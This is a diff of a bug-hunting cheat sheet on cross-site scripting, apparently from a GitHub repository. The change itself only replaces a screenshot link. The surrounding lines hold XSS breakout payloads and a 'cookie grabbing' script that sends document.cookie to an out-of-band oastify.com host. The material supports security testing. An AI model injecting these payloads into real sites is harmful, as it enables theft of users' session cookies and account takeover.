@@ -46,8 +46,7 @@ xss';alert(1);'xss
 '-alert(1)-'
 ```
 Finally the code will look like this after response.
-![image](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/8a708c31-a6c9-43d0-946e-09e7af240dbe)
-
+![Screenshot from 2024-06-23 19-29-18](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5387641e-5ee7-4dca-89a3-e1253a426bc5)
 #### For cookie grabbing.
 ```js
 <script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
